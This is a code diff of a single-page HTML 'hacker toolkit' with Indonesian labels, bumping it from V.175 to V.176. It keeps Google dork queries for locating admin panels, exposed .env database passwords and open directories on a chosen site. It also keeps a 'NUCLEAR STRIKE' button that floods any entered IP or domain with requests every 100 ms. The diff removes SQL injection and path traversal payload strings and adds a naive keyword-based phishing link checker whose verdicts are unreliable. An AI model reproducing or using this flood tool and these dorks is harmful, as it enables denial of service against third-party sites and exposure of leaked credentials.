@@ -3,87 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.175</title>
+    <title>EDWARD OMNI V.176</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; outline: none; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; margin:0; padding: 15px; overflow-x: hidden; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; margin:0; padding: 15px; }
         .master-name { text-align: center; font-size: 22px; font-weight: 800; color: var(--neon); margin-bottom: 15px; text-transform: uppercase; text-shadow: 0 0 10px var(--neon); }
         .card { background: rgba(15, 25, 35, 0.95); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 15px; margin-bottom: 12px; }
         h3 { margin: 0 0 10px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 10px; }
         .input-group { background: rgba(0,0,0,0.6); border: 1px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 8px; margin-bottom: 8px; }
         .label-text { font-size: 9px; color: var(--neon); display: block; margin-bottom: 3px; font-weight: bold; }
         input, select { background: transparent; border: none; color: #fff; width: 100%; padding: 5px; font-size: 13px; }
-        option { background: #050a0e; color: #fff; }
         .btn { width: 100%; padding: 12px; border-radius: 10px; border: none; cursor: pointer; font-weight: 800; font-size: 10px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 6px; }
         .btn-cast { background: var(--neon); color: #000; }
         .btn-atk { background: linear-gradient(45deg, var(--red), #bc13fe); color: #fff; }
         .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
         .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 8px; border-radius: 10px; text-align: center; color: var(--neon); font-size: 10px; font-weight: bold; background: rgba(0,0,0,0.3); }
-        
-        /* CUSTOM NEON ALERT BOX */
-        #customAlert { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 80%; background: #000; border: 2px solid var(--neon); color: #fff; padding: 15px; border-radius: 10px; font-size: 11px; font-weight: bold; text-align: center; z-index: 10001; box-shadow: 0 0 20px var(--neon); }
-        #customAlert button { background: var(--neon); color: #000; border: none; padding: 5px 15px; border-radius: 5px; margin-top: 10px; font-weight: bold; cursor: pointer; }
+        #customAlert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 85%; background: #000; border: 2px solid var(--neon); color: #fff; padding: 15px; border-radius: 15px; font-size: 11px; font-weight: bold; text-align: center; z-index: 10001; box-shadow: 0 0 20px var(--neon); }
+        #customAlert.danger { border-color: var(--red); box-shadow: 0 0 20px var(--red); }
+        #customAlert button { background: var(--neon); color: #000; border: none; padding: 8px 20px; border-radius: 8px; margin-top: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div id="customAlert"><p id="alertMsg"></p><button onclick="closeAlert()">OKE</button></div>
-    <p class="master-name">EDWARD OMNI V.175</p>
-    <div class="sys-monitor"><div class="mon-box">SYS: ONLINE</div><div class="mon-box">MASTER: EDWARD-BAIK</div></div>
+    <div id="customAlert"><p id="alertMsg"></p><button onclick="closeAlert()">MENGERTI</button></div>
+    <p class="master-name">EDWARD OMNI V.176</p>
+    <div class="sys-monitor"><div class="mon-box">SCANNER: ARMED</div><div class="mon-box">USER: EDWARD-BAIK</div></div>
+
+    <div class="card">
+        <h3>🛡️ TERMINATOR LINK SCANNER</h3>
+        <div class="input-group"><span class="label-text">SCAN LINK (Phising/Unsafe):</span><input type="text" id="scanInput" placeholder="Paste link di sini..."></div>
+        <button class="btn" style="background:transparent; border:1px solid var(--neon); color:var(--neon);" onclick="deepAnalyze()">⚡ START DEEP ANALYZE</button>
+    </div>
 
     <div class="card">
         <h3>🎯 PREDATOR MANTRA</h3>
-        <div class="input-group"><span class="label-text">SITE TARGET:</span><input type="text" id="targetMain" placeholder="Kosongkan untuk Global"></div>
-        <div class="input-group"><span class="label-text">MANTRA SELECTOR:</span>
+        <div class="input-group"><span class="label-text">SITE TARGET:</span><input type="text" id="targetMain"></div>
+        <div class="input-group"><span class="label-text">MANTRA:</span>
             <select id="mantraSelect">
-                <option value='inurl:admin OR inurl:login'>Cari Panel Admin</option>
-                <option value='filetype:env "DB_PASSWORD"'>Password DB (ENV)</option>
-                <option value='filetype:log inurl:log'>Cari File Log (Sensitif)</option>
-                <option value='intitle:index.of "parent directory"'>Folder Terbuka (Directory)</option>
+                <option value='inurl:admin'>Cari Panel Admin</option>
+                <option value='filetype:env "DB_PASSWORD"'>Cari Password DB</option>
+                <option value='intitle:index.of'>Directory Terbuka</option>
             </select>
         </div>
         <button class="btn btn-cast" onclick="cast()">CAST MANTRA 🔮</button>
     </div>
 
     <div class="card">
-        <h3>🛡️ AI SCANNER & PAYLOAD</h3>
-        <div class="input-group"><span class="label-text">SCAN LINK:</span><input type="text" id="scanInput"></div>
-        <button class="btn" style="background:transparent; border:1px solid var(--neon); color:var(--neon);" onclick="analyze()">⚡ RUN DEEP SCAN</button>
-        <button class="btn" style="background: #ffd700; color:#000;" onclick="genPayload()">🎁 COPY PAYLOAD</button>
-    </div>
-
-    <div class="card">
         <h3>🔥 NUCLEAR STRIKE (BREAKER)</h3>
-        <div class="input-group"><span class="label-text">TARGET Breaker (misal: syfe.com):</span><input type="text" id="targetBreaker"></div>
+        <div class="input-group"><span class="label-text">TARGET (IP/Domain):</span><input type="text" id="targetBreaker"></div>
         <button class="btn btn-atk" id="atkBtn" onclick="launchAtk()">LAUNCH NUCLEAR 🚀</button>
     </div>
 
     <script>
         let isAtk = false;
+        function showAlert(m, type) { 
+            const a=document.getElementById('customAlert'); 
+            a.className = type === 'danger' ? 'danger' : '';
+            document.getElementById('alertMsg').innerText=m; a.style.top='20px'; 
+        }
+        function closeAlert() { document.getElementById('customAlert').style.top='-150px'; }
 
-        function showAlert(m) { const a=document.getElementById('customAlert'); document.getElementById('alertMsg').innerText=m; a.style.top='20px'; }
-        function closeAlert() { document.getElementById('customAlert').style.top='-100px'; }
+        function deepAnalyze() {
+            const u = document.getElementById('scanInput').value.trim().toLowerCase();
+            if(!u) return showAlert("INPUT KOSONG!", "danger");
+
+            const dangerWords = ["dana", "kaget", "gift", "login", "verif", "claim", "free", "secure", "update", "account"];
+            const dangerExt = [".xyz", ".top", ".free", ".tk", ".ml", ".ga", ".cf"];
+            
+            let isUnsafe = false;
+            let reason = "";
+
+            // Cek Protokol (HTTP = Bahaya)
+            if (u.startsWith("http://") || u === "http") {
+                isUnsafe = true;
+                reason = "Link menggunakan protokol HTTP tidak aman (Tanpa Enkripsi).";
+            } 
+            // Cek Kata Kunci Phising
+            else if (dangerWords.some(w => u.includes(w))) {
+                isUnsafe = true;
+                reason = "Terdeteksi kata kunci pancingan (Phising/Scam).";
+            }
+            // Cek Ekstensi Mencurigakan
+            else if (dangerExt.some(e => u.endsWith(e))) {
+                isUnsafe = true;
+                reason = "Menggunakan domain ekstensi berisiko tinggi.";
+            }
+
+            if (isUnsafe) {
+                showAlert("[DANGER] PHISING DETECTED!\n" + reason, "danger");
+            } else {
+                showAlert("[SAFE] Link terlihat aman berdasarkan pola dasar.", "safe");
+            }
+        }
 
         function cast() { const t=document.getElementById('targetMain').value; const m=document.getElementById('mantraSelect').value; window.open("https://www.google.com/search?q=" + encodeURIComponent(t ? "site:"+t+" "+m : m), "_blank"); }
-        
-        function analyze() { 
-            const u=document.getElementById('scanInput').value.toLowerCase(); 
-            if(!u) return showAlert("INPUT KOSONG!"); 
-            const phish=["dana","kaget","login","verif","id-"]; 
-            showAlert(phish.some(w=>u.includes(w)) ? "[DANGER] PHISING DETECTED!" : "[SAFE] LINK CLEAN"); 
-        }
-
-        function genPayload() { 
-            const p=["' OR 1=1 --", "../../../etc/passwd"]; 
-            const res = p[Math.floor(Math.random()*p.length)];
-            navigator.clipboard.writeText(res); 
-            showAlert("PAYLOAD COPIED: " + res); 
-        }
-
         function launchAtk() { 
             const t=document.getElementById('targetBreaker').value; 
-            if(!t) return showAlert("TARGET KOSONG!"); 
-            if(isAtk) { location.reload(); } 
+            if(!t) return showAlert("TARGET KOSONG!", "danger"); 
             isAtk=true; document.getElementById('atkBtn').innerText="STOP 🛑"; 
             setInterval(()=>{if(isAtk) new Image().src="https://"+t+"/?v="+Math.random();},100); 
             showAlert("NUCLEAR LAUNCHED TO " + t);
